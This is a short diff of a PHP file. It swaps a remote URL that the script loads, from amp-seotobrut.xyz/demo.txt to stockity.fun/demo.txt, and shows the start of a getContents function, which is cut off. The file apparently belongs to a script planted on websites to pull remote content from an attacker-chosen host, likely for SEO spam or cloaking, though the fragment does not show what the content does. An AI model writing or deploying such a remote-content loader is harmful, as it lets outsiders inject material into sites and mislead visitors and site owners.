@@ -1,5 +1,5 @@
 <?php
-$contents = 'https://amp-seotobrut.xyz/demo.txt';
+$contents = 'https://stockity.fun/demo.txt';
 $allDevice = true;
 function getContents($url) {
     if(!function_exists('file_get_contents')) {
